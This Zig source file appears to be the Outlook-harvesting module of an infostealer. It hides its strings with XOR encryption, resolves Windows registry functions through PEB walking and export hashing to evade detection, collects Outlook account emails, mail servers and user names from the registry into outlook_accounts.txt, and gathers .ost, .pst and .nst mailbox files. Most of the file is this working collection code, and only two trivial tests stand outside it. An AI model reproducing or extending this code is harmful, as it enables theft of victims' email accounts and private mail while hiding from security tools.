const std = @import("std");
const hash = @import("../types/hash.zig");
const types = @import("../types/types.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    const OUTLOOK = hash.xorEncrypt("Microsoft\\Outlook");
    const OST_EXT = hash.xorEncrypt(".ost");
    const PST_EXT = hash.xorEncrypt(".pst");
    const NST_EXT = hash.xorEncrypt(".nst");
    const ADVAPI32 = hash.xorEncrypt("advapi32.dll");
    const REG_OPEN = hash.xorEncrypt("RegOpenKeyExW");
    const REG_QUERY = hash.xorEncrypt("RegQueryValueExW");
    const REG_CLOSE = hash.xorEncrypt("RegCloseKey");
    const REG_16 = hash.xorEncrypt("Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
    const REG_15 = hash.xorEncrypt("Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
    const REG_NT = hash.xorEncrypt("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676");
    const REG_MSG = hash.xorEncrypt("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676");
    const OUTLOOK_FILE = hash.xorEncrypt("outlook_accounts.txt");
    const SMTP_EMAIL = hash.xorEncrypt("SMTP Email Address");
    const SMTP_SERVER = hash.xorEncrypt("SMTP Server");
    const POP3_SERVER = hash.xorEncrypt("POP3 Server");
    const IMAP_SERVER = hash.xorEncrypt("IMAP Server");
    const SMTP_USER = hash.xorEncrypt("SMTP User Name");
    const POP3_USER = hash.xorEncrypt("POP3 User Name");
    const IMAP_USER = hash.xorEncrypt("IMAP User Name");
    const EMAIL = hash.xorEncrypt("Email");
    const DISPLAY_NAME = hash.xorEncrypt("Display Name");
    const NEWLINE = hash.xorEncrypt("\r\n");
};

const HKCU: types.HANDLE = @ptrFromInt(@as(usize, 0x80000001));
const KEY_READ: u32 = 0x20019;

const RegApi = struct {
    open: *const fn (key: types.HANDLE, sub: [*:0]const u16, options: u32, sam: u32, out: *types.HANDLE) callconv(.winapi) u32,
    query: *const fn (key: types.HANDLE, name: [*:0]const u16, reserved: ?*u32, typ: ?*u32, data: ?*u8, size: ?*u32) callconv(.winapi) u32,
    close: *const fn (key: types.HANDLE) callconv(.winapi) u32,
};

fn resolveRegApi() ?RegApi {
    const adv32 = peb_walk.getModuleByHash(hash.encryptedHashModule(&E.ADVAPI32)) orelse return null;
    var buf: [128]u8 = undefined;

    hash.xorDecrypt(&E.REG_OPEN, buf[0..E.REG_OPEN.len]);
    const open = @as(*const fn (key: types.HANDLE, sub: [*:0]const u16, options: u32, sam: u32, out: *types.HANDLE) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(adv32, hash.hashStringExact(buf[0..E.REG_OPEN.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.REG_QUERY, buf[0..E.REG_QUERY.len]);
    const query = @as(*const fn (key: types.HANDLE, name: [*:0]const u16, reserved: ?*u32, typ: ?*u32, data: ?*u8, size: ?*u32) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(adv32, hash.hashStringExact(buf[0..E.REG_QUERY.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.REG_CLOSE, buf[0..E.REG_CLOSE.len]);
    const close = @as(*const fn (key: types.HANDLE) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(adv32, hash.hashStringExact(buf[0..E.REG_CLOSE.len], 27)) orelse return null)));

    return RegApi{ .open = open, .query = query, .close = close };
}

fn toUtf16Le(buf: []u16, s: []const u8) void {
    var i: usize = 0;
    while (i < s.len and i < buf.len) : (i += 1) {
        buf[i] = s[i];
    }
    if (i < buf.len) buf[i] = 0;
}

fn readRegValue(api: RegApi, key: types.HANDLE, name_wide: [*:0]const u16, typ: ?*u32, data: ?*u8, size: ?*u32) u32 {
    return api.query(key, name_wide, null, typ, data, size);
}

fn readRegString(api: RegApi, key: types.HANDLE, name_utf8: []const u8, allocator: std.mem.Allocator) ?[]u8 {
    var name_wide: [128]u16 = undefined;
    toUtf16Le(&name_wide, name_utf8);

    var typ: u32 = 0;
    var size: u32 = 0;
    if (readRegValue(api, key, &name_wide, &typ, null, &size) != 0) return null;
    if (size == 0 or size > 4096) return null;

    var raw: [4096]u8 = undefined;
    if (readRegValue(api, key, &name_wide, null, &raw, &size) != 0) return null;

    const utf16_len = size / 2;
    if (utf16_len == 0) return null;
    const u16_slice = @as([*]u16, @ptrCast(@alignCast(&raw)))[0..utf16_len];
    var actual_len = utf16_len;
    while (actual_len > 0 and u16_slice[actual_len - 1] == 0) {
        actual_len -= 1;
    }
    if (actual_len == 0) return null;

    var out = std.ArrayList(u8).init(allocator);
    for (0..actual_len) |i| {
        const cp = u16_slice[i];
        if (cp < 0x80) {
            out.append(@as(u8, @intCast(cp & 0x7F))) catch return null;
        } else if (cp < 0x800) {
            out.append(@as(u8, @intCast(0xC0 | (cp >> 6)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch return null;
        } else {
            out.append(@as(u8, @intCast(0xE0 | (cp >> 12)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch return null;
        }
    }
    return out.toOwnedSlice() catch null;
}

fn queryRegistryPath(api: RegApi, root_path: []const u8, allocator: std.mem.Allocator) ?[]u8 {
    var root_wide: [512]u16 = undefined;
    toUtf16Le(&root_wide, root_path);

    var key_handle: types.HANDLE = undefined;
    if (api.open(HKCU, &root_wide, 0, KEY_READ, &key_handle) != 0) return null;
    defer _ = api.close(key_handle);

    var result = std.ArrayList(u8).init(allocator);
    errdefer result.deinit();

    var smtp_email_buf: [E.SMTP_EMAIL.len]u8 = undefined;
    var smtp_server_buf: [E.SMTP_SERVER.len]u8 = undefined;
    var pop3_server_buf: [E.POP3_SERVER.len]u8 = undefined;
    var imap_server_buf: [E.IMAP_SERVER.len]u8 = undefined;
    var smtp_user_buf: [E.SMTP_USER.len]u8 = undefined;
    var pop3_user_buf: [E.POP3_USER.len]u8 = undefined;
    var imap_user_buf: [E.IMAP_USER.len]u8 = undefined;
    var email_buf: [E.EMAIL.len]u8 = undefined;
    var display_name_buf: [E.DISPLAY_NAME.len]u8 = undefined;
    hash.xorDecrypt(&E.SMTP_EMAIL, &smtp_email_buf);
    hash.xorDecrypt(&E.SMTP_SERVER, &smtp_server_buf);
    hash.xorDecrypt(&E.POP3_SERVER, &pop3_server_buf);
    hash.xorDecrypt(&E.IMAP_SERVER, &imap_server_buf);
    hash.xorDecrypt(&E.SMTP_USER, &smtp_user_buf);
    hash.xorDecrypt(&E.POP3_USER, &pop3_user_buf);
    hash.xorDecrypt(&E.IMAP_USER, &imap_user_buf);
    hash.xorDecrypt(&E.EMAIL, &email_buf);
    hash.xorDecrypt(&E.DISPLAY_NAME, &display_name_buf);

    const RegValue = struct { name: []const u8, buf: []const u8 };
    const values = [_]RegValue{
        .{ .name = "Display Name", .buf = display_name_buf[0..] },
        .{ .name = "SMTP Email Address", .buf = smtp_email_buf[0..] },
        .{ .name = "Email", .buf = email_buf[0..] },
        .{ .name = "SMTP Server", .buf = smtp_server_buf[0..] },
        .{ .name = "POP3 Server", .buf = pop3_server_buf[0..] },
        .{ .name = "IMAP Server", .buf = imap_server_buf[0..] },
        .{ .name = "SMTP User Name", .buf = smtp_user_buf[0..] },
        .{ .name = "POP3 User Name", .buf = pop3_user_buf[0..] },
        .{ .name = "IMAP User Name", .buf = imap_user_buf[0..] },
    };

    for (values) |v| {
        const val = readRegString(api, key_handle, v.buf, allocator) orelse continue;
        defer allocator.free(val);
        result.appendSlice(v.name) catch return null;
        result.appendSlice(": ") catch return null;
        result.appendSlice(val) catch return null;
        result.appendSlice("\r\n") catch return null;
    }

    if (result.items.len == 0) return null;
    return result.toOwnedSlice() catch null;
}

fn collectRegistryFile(allocator: std.mem.Allocator, base_path: []const u8, files: *std.ArrayList([]const u8)) void {
    const api = resolveRegApi() orelse return;

    var reg_16_buf: [E.REG_16.len]u8 = undefined;
    var reg_15_buf: [E.REG_15.len]u8 = undefined;
    var reg_nt_buf: [E.REG_NT.len]u8 = undefined;
    var reg_msg_buf: [E.REG_MSG.len]u8 = undefined;
    var outlook_file_buf: [E.OUTLOOK_FILE.len]u8 = undefined;
    hash.xorDecrypt(&E.REG_16, &reg_16_buf);
    hash.xorDecrypt(&E.REG_15, &reg_15_buf);
    hash.xorDecrypt(&E.REG_NT, &reg_nt_buf);
    hash.xorDecrypt(&E.REG_MSG, &reg_msg_buf);
    hash.xorDecrypt(&E.OUTLOOK_FILE, &outlook_file_buf);

    var all_data = std.ArrayList(u8).init(allocator);
    defer all_data.deinit();

    const paths = [_][]const u8{ reg_16_buf[0..], reg_15_buf[0..], reg_nt_buf[0..], reg_msg_buf[0..] };
    for (paths) |p| {
        const data = queryRegistryPath(api, p, allocator) orelse continue;
        defer allocator.free(data);
        all_data.appendSlice(data) catch return;
        all_data.appendSlice("\r\n") catch return;
    }

    if (all_data.items.len == 0) return;

    const file_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, outlook_file_buf[0..] }) catch return;
    const file = std.fs.createFileAbsolute(file_path, .{}) catch {
        allocator.free(file_path);
        return;
    };
    defer file.close();
    file.writeAll(all_data.items) catch {
        allocator.free(file_path);
        return;
    };
    files.append(file_path) catch {
        allocator.free(file_path);
    };
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var outlook_buf: [E.OUTLOOK.len]u8 = undefined;
    var ost_ext_buf: [E.OST_EXT.len]u8 = undefined;
    var pst_ext_buf: [E.PST_EXT.len]u8 = undefined;
    var nst_ext_buf: [E.NST_EXT.len]u8 = undefined;
    hash.xorDecrypt(&E.OUTLOOK, &outlook_buf);
    hash.xorDecrypt(&E.OST_EXT, &ost_ext_buf);
    hash.xorDecrypt(&E.PST_EXT, &pst_ext_buf);
    hash.xorDecrypt(&E.NST_EXT, &nst_ext_buf);

    const base_path = std.fs.path.join(allocator, &[_][]const u8{ local, outlook_buf[0..] }) catch return try allocator.alloc([]const u8, 0);
    defer allocator.free(base_path);

    collectRegistryFile(allocator, base_path, &files);

    var dir = std.fs.openDirAbsolute(base_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();

    const exts = [_][]const u8{ ost_ext_buf[0..], pst_ext_buf[0..], nst_ext_buf[0..] };

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const name = entry.name;
        var matched = false;
        for (exts) |ext| {
            if (std.mem.endsWith(u8, name, ext)) {
                matched = true;
                break;
            }
        }
        if (!matched) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ base_path, name });
        try files.append(full);
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__outlook");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collect handles empty local dir" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__outlook_empty");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}
